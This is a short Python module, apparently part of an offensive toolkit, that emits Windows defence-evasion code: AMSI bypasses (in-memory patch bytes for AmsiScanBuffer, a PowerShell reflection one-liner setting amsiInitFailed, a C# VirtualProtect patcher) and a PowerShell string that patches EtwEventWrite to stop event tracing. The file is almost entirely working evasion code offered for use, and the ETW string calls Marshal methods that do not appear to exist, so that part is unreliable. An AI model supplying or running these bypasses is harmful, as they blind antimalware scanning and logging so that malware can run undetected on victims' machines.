# -*- coding: utf-8 -*-
"""AMSI bypass techniques -- patch, unhook, reflection, memory manipulation.

Author: zxwn
"""
import struct, ctypes, os

AMSI_PATCH_X64 = bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])


def generate_amsi_patch_ps() -> str:
    return (
        '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")'
        '.GetField("amsiInitFailed","NonPublic,Static")'
        '.SetValue($null,$true)'
    )


def generate_amsi_patch_csharp() -> str:
    return """using System;
using System.Runtime.InteropServices;
class AMSI {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string proc);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddr, uint sz, uint flNew, out uint old);
    static void Patch() {
        var lib = LoadLibrary("amsi.dll");
        var addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old;
        VirtualProtect(addr, 6, 0x40, out old);
        Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3}, 0, addr, 6);
    }
}"""


ETW_PATCH_PS = (
    '$p=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer('
    '[Runtime.InteropServices.Marshal]::GetProcAddress('
    '[Runtime.InteropServices.Marshal]::GetModuleHandle("ntdll.dll"),"EtwEventWrite"'
    '),[Action[IntPtr,IntPtr,IntPtr,IntPtr]]);'
    '[Runtime.InteropServices.Marshal]::WriteByte('
    '[Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($p),0xC3)'
)


if __name__ == "__main__":
    print("[amsi_bypass] Loaded.")
